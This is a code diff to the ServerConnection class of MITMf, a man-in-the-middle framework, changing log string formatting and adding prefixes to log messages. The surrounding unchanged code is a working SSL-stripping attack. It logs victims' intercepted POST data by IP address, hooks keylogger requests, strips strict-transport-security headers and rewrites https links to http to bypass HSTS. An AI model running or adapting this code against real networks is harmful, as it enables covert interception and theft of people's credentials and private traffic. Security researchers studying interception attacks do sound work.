@@ -70,18 +70,18 @@ class ServerConnection(HTTPClient):
         if self.command == 'GET':
             try:
                 user_agent = parse(self.headers['user-agent'])
-                self.clientInfo = "%s [type:%s-%s os:%s] "  % (self.client.getClientIP(), user_agent.browser.family, user_agent.browser.version[0], user_agent.os.family)
+                self.clientInfo = "{0} [type:{1}-{2} os:{3}] ".format(self.client.getClientIP(), user_agent.browser.family, user_agent.browser.version[0], user_agent.os.family)
             except:
-                self.clientInfo = "%s " % self.client.getClientIP()
+                self.clientInfo = "{} ".format(self.client.getClientIP())
 
-            mitmf_logger.info(self.clientInfo + "Sending Request: %s" % self.headers['host'])
+            mitmf_logger.info(self.clientInfo + "Sending Request: {}".format(self.headers['host']))
 
         self.plugins.hook()
         self.sendCommand(self.command, self.uri)
 
     def sendHeaders(self):
         for header, value in self.headers.iteritems():
-            mitmf_logger.debug("Sending header: (%s => %s)" % (header, value))
+            mitmf_logger.debug("[ServerConnection] Sending header: ({} => {})".format(header, value))
             self.sendHeader(header, value)
 
         self.endHeaders()
@@ -92,11 +92,11 @@ class ServerConnection(HTTPClient):
         elif 'keylog' in self.uri:
             self.plugins.hook()
         else:
-            mitmf_logger.warning("%s %s Data (%s):\n%s" % (self.client.getClientIP(), self.getPostPrefix(), self.headers['host'], self.postData))
+            mitmf_logger.warning("{0} {1} Data ({2}):\n{3}".format(self.client.getClientIP(), self.getPostPrefix(), self.headers['host'], self.postData))
             self.transport.write(self.postData)
 
     def connectionMade(self):
-        mitmf_logger.debug("HTTP connection made.")
+        mitmf_logger.debug("[ServerConnection] HTTP connection made.")
         self.plugins.hook()
         self.sendRequest()
         self.sendHeaders()
@@ -105,11 +105,11 @@ class ServerConnection(HTTPClient):
             self.sendPostData()
 
     def handleStatus(self, version, code, message):
-        mitmf_logger.debug("Got server response: %s %s %s" % (version, code, message))
+        mitmf_logger.debug("[ServerConnection] Got server response: {0} {1} {2}".format(version, code, message))
         self.client.setResponseCode(int(code), message)
 
     def handleHeader(self, key, value):
-        mitmf_logger.debug("[ServerConnection] Receiving header: (%s => %s)" % (key, value))
+        mitmf_logger.debug("[ServerConnection] Receiving header ({}: {})".format(key, value))
 
         if (key.lower() == 'location'):
             value = self.replaceSecureLinks(value)
@@ -119,15 +119,15 @@ class ServerConnection(HTTPClient):
         if (key.lower() == 'content-type'):
             if (value.find('image') != -1):
                 self.isImageRequest = True
-                mitmf_logger.debug("Response is image content, not scanning...")
+                mitmf_logger.debug("[ServerConnection] Response is image content, not scanning...")
 
         if (key.lower() == 'content-encoding'):
             if (value.find('gzip') != -1):
-                mitmf_logger.debug("Response is compressed...")
+                mitmf_logger.debug("[ServerConnection] Response is compressed...")
                 self.isCompressed = True
 
         elif (key.lower()== 'strict-transport-security'):
-            mitmf_logger.info("%s Zapped a strict-trasport-security header" % self.client.getClientIP())
+            mitmf_logger.info("{} Zapped a strict-trasport-security header".format(self.client.getClientIP()))
 
         elif (key.lower() == 'content-length'):
             self.contentLength = value
@@ -164,10 +164,11 @@ class ServerConnection(HTTPClient):
 
     def handleResponse(self, data):
         if (self.isCompressed):
-            mitmf_logger.debug("Decompressing content...")
+            mitmf_logger.debug("[ServerConnection] Decompressing content...")
             data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
             
         #mitmf_logger.debug("Read from server:\n" + data)
+        mitmf_logger.debug("[ServerConnection] Read from server {} bytes of data".format(len(data)))
 
         data = self.replaceSecureLinks(data)
         res = self.plugins.hook()
@@ -184,7 +185,7 @@ class ServerConnection(HTTPClient):
         try:
             self.shutdown()
         except:
-            mitmf_logger.info("Client connection dropped before request finished.")
+            mitmf_logger.info("[ServerConnection] Client connection dropped before request finished.")
 
     def replaceSecureLinks(self, data):
         if self.hsts:
@@ -193,7 +194,7 @@ class ServerConnection(HTTPClient):
             patchDict = self.urlMonitor.patchDict
 
             if len(patchDict)>0:
-                dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
+                dregex = re.compile("({})".format("|".join(map(re.escape, patchDict.keys()))))
                 data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)
 
             iterator = re.finditer(ServerConnection.urlExpression, data)       
@@ -202,13 +203,13 @@ class ServerConnection(HTTPClient):
 
                 mitmf_logger.debug("[ServerConnection] Found secure reference: " + url)
                 nuevaurl=self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
-                mitmf_logger.debug("[ServerConnection][HSTS] Replacing %s => %s"%(url,nuevaurl))
+                mitmf_logger.debug("[ServerConnection][HSTS] Replacing {} => {}".format(url,nuevaurl))
                 sustitucion[url] = nuevaurl
                 #data.replace(url,nuevaurl)
 
             #data = self.urlMonitor.DataReemplazo(data)
             if len(sustitucion)>0:
-                dregex = re.compile("(%s)" % "|".join(map(re.escape, sustitucion.keys())))
+                dregex = re.compile("({})".format("|".join(map(re.escape, sustitucion.keys()))))
                 data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)
 
             #mitmf_logger.debug("HSTS DEBUG received data:\n"+data)   
@@ -227,7 +228,7 @@ class ServerConnection(HTTPClient):
             for match in iterator:
                 url = match.group()
 
-                mitmf_logger.debug("Found secure reference: " + url)
+                mitmf_logger.debug("[ServerConnection] Found secure reference: " + url)
 
                 url = url.replace('https://', 'http://', 1)
                 url = url.replace('&amp;', '&')
